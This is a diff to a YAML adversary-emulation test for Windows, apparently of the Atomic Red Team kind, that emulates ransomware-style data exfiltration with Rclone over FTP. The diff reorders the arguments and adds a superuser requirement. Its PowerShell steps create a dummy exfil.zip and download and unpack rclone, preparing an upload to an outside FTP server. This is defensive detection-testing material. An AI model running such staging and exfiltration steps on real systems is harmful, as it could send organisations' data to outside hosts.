@@ -4,6 +4,9 @@ description: |-
     Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.
     [Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)
 args:
+    - name: ftp_port
+      type: integer
+      default: "21"
     - name: ftp_server
       type: string
       default: ftp.dlptest.com
@@ -13,9 +16,6 @@ args:
     - name: ftp_user
       type: string
       default: dlpuser
-    - name: ftp_port
-      type: int
-      default: "21"
 uuid: b854eb97-bf9b-45ab-a1b5-b94e4880c56b
 mitre:
     tactics:
@@ -27,18 +27,19 @@ mitre:
 requirements:
     platforms:
         - os: windows
+    superuser: true
 steps:
     - name: |
         Check if the exfil package exists
       inline: |
-        if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0} else {{fsutil file createnew C:\Users\Public\Downloads\exfil.zip 20485760
-        }}
+        if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0} else { {fsutil file createnew C:\Users\Public\Downloads\exfil.zip 20485760
+        } }
       executor: powershell
     - name: Check if rclone zip exists
       inline: |
-        if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip) {exit 0} else {{Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"
+        if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip) {exit 0} else { {Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"
         Expand-Archive C:\Users\Public\Downloads\rclone-current-windows-amd64.zip -DestinationPath C:\Users\Public\Downloads\
-        }}
+        } }
       executor: powershell
     - name: exfiltration-over-alternative-protocol---ftp---rclone
       inline: |-
